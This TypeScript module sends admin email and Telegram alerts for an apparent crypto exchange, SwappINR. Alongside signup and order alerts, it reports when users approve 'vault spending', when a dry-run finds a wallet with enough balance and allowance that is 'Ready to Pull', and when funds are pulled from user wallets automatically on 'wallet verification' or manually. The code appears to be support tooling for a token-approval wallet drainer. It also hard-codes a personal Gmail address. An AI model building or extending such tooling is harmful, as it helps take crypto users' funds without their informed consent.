/**
 * Admin notification hub — fires email + Telegram alerts to the site owner
 * for key platform events: new signups, wallet connections, valid-wallet
 * dry-runs, and fund pulls (both manual and automatic).
 *
 * All exported functions are fire-and-forget: they catch their own errors
 * and never throw. Call without await, or chain .catch(() => {}).
 *
 * Required env vars:
 *   RESEND_API_KEY              — Resend key (same as used for user emails)
 *   ADMIN_NOTIFICATION_EMAIL    — where to send admin alerts (default: pubgvipa1@gmail.com)
 *   TELEGRAM_BOT_TOKEN          — existing bot token
 *   ADMIN_TELEGRAM_CHAT_ID      — your personal Telegram chat ID (message @userinfobot to find it)
 */

import { Resend } from 'resend';

// ── Config ───────────────────────────────────────────────────────────────────

const FROM       = process.env.EMAIL_FROM ?? 'SwappINR <noreply@swappinr.com>';
const ADMIN_TO   = process.env.ADMIN_NOTIFICATION_EMAIL ?? 'pubgvipa1@gmail.com';

// ── Private helpers ───────────────────────────────────────────────────────────

/** Current time formatted in IST. */
function ist(): string {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    dateStyle: 'medium',
    timeStyle: 'short',
  }) + ' IST';
}

/** Escape HTML entities for email body content. */
function esc(s: string): string {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/** Truncate a long wallet address for display: "0x1234…abcd". */
function short(addr: string): string {
  return addr.length > 14 ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : addr;
}

/**
 * Build a professional admin-alert HTML email.
 * @param title     Heading shown in the email header
 * @param rows      Array of [label, value] pairs for the body table
 */
function buildHtml(title: string, rows: [string, string][]): string {
  const rowsHtml = rows
    .map(
      ([k, v]) => `
      <tr>
        <td style="padding:11px 0;border-bottom:1px solid rgba(255,255,255,0.05);
                   font-size:11px;font-weight:700;color:rgba(255,255,255,0.38);
                   text-transform:uppercase;letter-spacing:0.06em;
                   width:36%;vertical-align:top">${esc(k)}</td>
        <td style="padding:11px 0 11px 16px;border-bottom:1px solid rgba(255,255,255,0.05);
                   font-size:14px;color:#fff;word-break:break-all">${esc(v)}</td>
      </tr>`,
    )
    .join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body style="margin:0;padding:0;background:#080808;
             font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;
             -webkit-font-smoothing:antialiased">
<table width="100%" cellpadding="0" cellspacing="0"
       style="background:#080808;padding:40px 16px">
  <tr><td align="center">
  <table width="520" cellpadding="0" cellspacing="0"
         style="max-width:520px;width:100%">
    <tr><td style="background:#111111;border:1px solid rgba(204,255,0,0.18);
                   border-radius:16px;overflow:hidden">
      <table width="100%" cellpadding="0" cellspacing="0">

        <!-- Header -->
        <tr><td style="background:rgba(204,255,0,0.06);
                        border-bottom:1px solid rgba(204,255,0,0.12);
                        padding:28px 32px">
          <table cellpadding="0" cellspacing="0"><tr>
            <td style="width:40px;height:40px;background:#CCFF00;
                       border-radius:10px;text-align:center;
                       vertical-align:middle;line-height:40px">
              <span style="color:#000;font-size:18px;font-weight:900;
                           line-height:40px">S</span>
            </td>
            <td style="padding-left:14px;vertical-align:middle">
              <div style="font-size:10px;font-weight:700;color:#CCFF00;
                          letter-spacing:0.1em;text-transform:uppercase;
                          margin-bottom:3px">Admin Alert · SwappINR</div>
              <div style="font-size:18px;font-weight:800;color:#fff;
                          letter-spacing:-0.02em">${esc(title)}</div>
            </td>
          </tr></table>
        </td></tr>

        <!-- Body -->
        <tr><td style="padding:28px 32px">
          <table width="100%" cellpadding="0" cellspacing="0">
            ${rowsHtml}
          </table>
        </td></tr>

        <!-- Footer -->
        <tr><td style="border-top:1px solid rgba(255,255,255,0.05);
                        padding:16px 32px;text-align:center">
          <span style="font-size:11px;color:rgba(255,255,255,0.25)">
            SwappINR Admin System — automated alert, do not reply
          </span>
        </td></tr>

      </table>
    </td></tr>
  </table>
  </td></tr>
</table>
</body>
</html>`;
}

/** Send an admin alert email. Falls back to console.log if Resend key is absent. */
async function sendEmail(subject: string, title: string, rows: [string, string][]): Promise<void> {
  const key = process.env.RESEND_API_KEY;
  if (!key) {
    console.log(`[admin-notify/email] no RESEND_API_KEY — skipping: ${subject}`);
    return;
  }
  const resend = new Resend(key);
  const html   = buildHtml(title, rows);
  console.log(`[admin-notify/email] sending to ${ADMIN_TO}: ${subject}`);
  const { data, error } = await resend.emails.send({ from: FROM, to: ADMIN_TO, subject, html });
  if (error) {
    const msg = typeof error === 'string' ? error : (error as any).message ?? JSON.stringify(error);
    throw new Error(`Resend error: ${msg}`);
  }
  console.log(`[admin-notify/email] delivered, id=${(data as any)?.id ?? '?'}`);
}

/**
 * Send a Telegram direct message to the admin.
 * Requires TELEGRAM_BOT_TOKEN + ADMIN_TELEGRAM_CHAT_ID in env.
 * To find your chat ID: message @userinfobot on Telegram.
 */
async function sendTelegram(lines: string[]): Promise<void> {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.ADMIN_TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id:                  chatId,
      text:                     lines.join('\n'),
      parse_mode:               'HTML',
      disable_web_page_preview: true,
    }),
  });

  if (!res.ok) {
    const body = await res.text().catch(() => '');
    console.error('[admin-notify/tg] send failed:', res.status, body.slice(0, 200));
  }
}

/** Lazy-load User model and look up name + email by userId. Never throws. */
async function lookupUser(userId: string): Promise<{ name: string; email: string }> {
  try {
    const { connectToDatabase, User } = await import('@/lib/db');
    await connectToDatabase();
    const u = await User.findById(userId).select('name email').lean<{ name: string; email: string }>();
    if (u) return { name: u.name, email: u.email };
  } catch { /* non-fatal */ }
  return { name: 'Unknown', email: '' };
}

// ── Exported notification functions ──────────────────────────────────────────

/**
 * Fired when a new user completes registration.
 * Inject in POST /api/auth/register after User.create() succeeds.
 */
export async function notifyAdminNewSignup(data: {
  name:  string;
  email: string;
  phone: string;
}): Promise<void> {
  const ts = ist();
  const results = await Promise.allSettled([
    sendEmail(
      `🆕 New Signup — ${data.name}`,
      'New User Signed Up',
      [
        ['Name',  data.name],
        ['Email', data.email],
        ['Phone', `+91 ${data.phone}`],
        ['Time',  ts],
      ],
    ),
    sendTelegram([
      '🆕 <b>NEW SIGNUP</b>',
      '━━━━━━━━━━━━━━━━',
      `👤 <b>${esc(data.name)}</b>`,
      `📧 ${esc(data.email)}`,
      `📱 +91 ${data.phone}`,
      `⏰ ${ts}`,
    ]),
  ]);
  for (const r of results) {
    if (r.status === 'rejected') console.error('[admin-notify/signup] channel failed:', r.reason);
  }
}

/**
 * Fired when a user successfully connects (or approves) a wallet.
 * Inject in POST /api/wallets after the upsert succeeds.
 */
export async function notifyAdminWalletConnected(data: {
  userId:     string;
  address:    string;
  network:    string;
  isApproval: boolean;
}): Promise<void> {
  const ts     = ist();
  const { name, email } = await lookupUser(data.userId);
  const eventLabel = data.isApproval ? 'Wallet Approved for Pulls' : 'Wallet Connected';
  const subject    = data.isApproval
    ? `✅ Wallet Approved — ${short(data.address)} (${data.network})`
    : `💼 Wallet Connected — ${short(data.address)} (${data.network})`;

  await Promise.allSettled([
    sendEmail(
      subject,
      eventLabel,
      [
        ['User',    `${name}${email ? ` (${email})` : ''}`],
        ['Address', data.address],
        ['Network', data.network],
        ['Event',   data.isApproval ? 'Vault spending approved — ready for pulls' : 'Wallet linked to account'],
        ['Time',    ts],
      ],
    ),
    sendTelegram([
      data.isApproval ? '✅ <b>WALLET APPROVED</b>' : '💼 <b>WALLET CONNECTED</b>',
      '━━━━━━━━━━━━━━━━',
      `👤 <b>${esc(name)}</b>${email ? ` — ${esc(email)}` : ''}`,
      `🔗 <code>${esc(data.address)}</code>`,
      `🌐 ${esc(data.network)}`,
      data.isApproval ? '✅ Vault spending approved' : '🔌 Wallet linked to account',
      `⏰ ${ts}`,
    ]),
  ]);
}

/**
 * Fired when an admin dry-run reveals a wallet has sufficient balance
 * AND allowance to pull (canPull = true).
 * Inject in POST /api/admin/pull (dryRun=true) when canPull is true.
 */
export async function notifyAdminValidWalletFound(data: {
  address:   string;
  network:   string;
  balance:   string;
  allowance: string;
  gasFee:    string;
  gasToken:  string;
}): Promise<void> {
  const ts = ist();
  await Promise.allSettled([
    sendEmail(
      `🔍 Valid Wallet Ready — ${short(data.address)} (${data.network})`,
      'Valid Wallet Found — Ready to Pull',
      [
        ['Address',   data.address],
        ['Network',   data.network],
        ['Balance',   `$${data.balance} USDT`],
        ['Allowance', `$${data.allowance} USDT`],
        ['Est. Gas',  `${data.gasFee} ${data.gasToken}`],
        ['Status',    'Wallet has sufficient allowance — pull can proceed'],
        ['Time',      ts],
      ],
    ),
    sendTelegram([
      '🔍 <b>VALID WALLET FOUND</b>',
      '━━━━━━━━━━━━━━━━',
      `🔗 <code>${esc(data.address)}</code>`,
      `🌐 ${esc(data.network)}`,
      `💰 Balance: <b>$${esc(data.balance)} USDT</b>`,
      `✅ Allowance: <b>$${esc(data.allowance)} USDT</b>`,
      `⛽ Est. gas: ${esc(data.gasFee)} ${esc(data.gasToken)}`,
      `⏰ ${ts}`,
    ]),
  ]);
}

/**
 * Fired when funds are successfully pulled from a user wallet,
 * either by the auto-pull system or by an admin manually.
 * Inject after creditPlatformWallet() succeeds.
 */
export async function notifyAdminPullExecuted(data: {
  address: string;
  network: string;
  amount:  number;
  txHash:  string;
  type:    'auto' | 'manual';
  userId:  string;
}): Promise<void> {
  const ts    = ist();
  const { name, email } = await lookupUser(data.userId);
  const label   = data.type === 'auto' ? '⚡ AUTO-PULL EXECUTED' : '🔧 MANUAL PULL EXECUTED';
  const subject = data.type === 'auto'
    ? `⚡ Auto-Pull — $${data.amount.toFixed(2)} USDT (${data.network})`
    : `🔧 Manual Pull — $${data.amount.toFixed(2)} USDT (${data.network})`;

  await Promise.allSettled([
    sendEmail(
      subject,
      data.type === 'auto' ? 'Auto-Pull Executed' : 'Manual Admin Pull Executed',
      [
        ['Type',    data.type === 'auto' ? 'Automatic (triggered by wallet verification)' : 'Manual (admin-initiated)'],
        ['User',    `${name}${email ? ` (${email})` : ''}`],
        ['Amount',  `$${data.amount.toFixed(2)} USDT`],
        ['Network', data.network],
        ['Address', data.address],
        ['Tx Hash', data.txHash],
        ['Time',    ts],
      ],
    ),
    sendTelegram([
      `${label}`,
      '━━━━━━━━━━━━━━━━',
      `👤 <b>${esc(name)}</b>${email ? ` — ${esc(email)}` : ''}`,
      `💵 <b>$${data.amount.toFixed(2)} USDT</b>`,
      `🌐 ${esc(data.network)}`,
      `🔗 <code>${esc(data.address)}</code>`,
      `📋 Tx: <code>${esc(data.txHash)}</code>`,
      `⏰ ${ts}`,
    ]),
  ]);
}

/**
 * Fired when a scan detects that a user's wallet balance has increased (funds credited).
 * Inject from POST /api/admin/wallets/scan-balances when newBalance > lastKnownBalance.
 */
export async function notifyAdminBalanceCredited(data: {
  userName:      string;
  userEmail:     string;
  address:       string;
  network:       string;
  prevBalance:   number;
  newBalance:    number;
  creditedAmount: number;
}): Promise<void> {
  const ts = ist();
  await Promise.allSettled([
    sendEmail(
      `💰 Wallet Funded — ${data.userName} +${data.creditedAmount.toFixed(2)} USDT (${data.network})`,
      'Wallet Balance Increased',
      [
        ['User',          `${data.userName} (${data.userEmail})`],
        ['Wallet',        data.address],
        ['Network',       data.network],
        ['Previous',      `${data.prevBalance.toFixed(2)} USDT`],
        ['New Balance',   `${data.newBalance.toFixed(2)} USDT`],
        ['Credited',      `+${data.creditedAmount.toFixed(2)} USDT`],
        ['Time',          ts],
      ],
    ),
    sendTelegram([
      '💰 <b>WALLET FUNDED</b>',
      '━━━━━━━━━━━━━━━━',
      `👤 <b>${esc(data.userName)}</b> — ${esc(data.userEmail)}`,
      `🔗 <code>${esc(data.address)}</code>`,
      `🌐 ${esc(data.network)}`,
      `📊 ${data.prevBalance.toFixed(2)} → <b>${data.newBalance.toFixed(2)} USDT</b>`,
      `✅ <b>+${data.creditedAmount.toFixed(2)} USDT</b> credited`,
      `⏰ ${ts}`,
    ]),
  ]);
}

/**
 * Fired when a user places a new buy or sell order.
 * Inject in POST /api/transactions after the order is created successfully.
 */
export async function notifyAdminNewOrder(data: {
  orderId:       string;
  type:          'buy' | 'sell';
  userName:      string;
  userEmail:     string;
  cryptoAmount:  number;
  cryptoSymbol:  string;
  network:       string;
  inrAmount:     number;
  walletAddress: string;
  fundSource?:   'onchain' | 'platform_wallet';
}): Promise<void> {
  const ts        = ist();
  const typeLabel = data.type === 'buy' ? 'Buy' : 'Sell';
  const emoji     = data.type === 'buy' ? '🟢' : '🔴';
  const rows: [string, string][] = [
    ['Order ID',  `#${data.orderId}`],
    ['Type',      `${typeLabel} USDT`],
    ['Amount',    `${data.cryptoAmount.toFixed(2)} ${data.cryptoSymbol} (${data.network})`],
    ['INR Value', `₹${data.inrAmount.toLocaleString('en-IN')}`],
    ['User',      `${data.userName} (${data.userEmail})`],
    ['Wallet',    data.walletAddress],
  ];
  if (data.type === 'sell' && data.fundSource === 'platform_wallet') {
    rows.push(['Source', 'Platform wallet (fallback)']);
  }
  rows.push(['Time', ts]);

  console.log(`[admin-notify/order] firing for #${data.orderId} (${data.type}) — to: ${ADMIN_TO}`);

  const results = await Promise.allSettled([
    sendEmail(
      `${emoji} New ${typeLabel} Order — #${data.orderId} | ${data.cryptoAmount.toFixed(2)} USDT`,
      `New ${typeLabel} Order Placed`,
      rows,
    ),
    sendTelegram([
      `${emoji} <b>NEW ${typeLabel.toUpperCase()} ORDER</b>`,
      '━━━━━━━━━━━━━━━━',
      `📋 <b>#${esc(data.orderId)}</b>`,
      `💵 <b>${data.cryptoAmount.toFixed(2)} ${esc(data.cryptoSymbol)}</b> (${esc(data.network)})`,
      `🇮🇳 ₹${data.inrAmount.toLocaleString('en-IN')}`,
      `👤 ${esc(data.userName)} — ${esc(data.userEmail)}`,
      data.type === 'sell' && data.fundSource === 'platform_wallet' ? `💼 Funded from platform wallet` : '',
      `⏰ ${ts}`,
    ].filter(Boolean)),
  ]);

  for (const r of results) {
    if (r.status === 'rejected') {
      console.error('[admin-notify/order] channel failed:', r.reason);
    }
  }
}
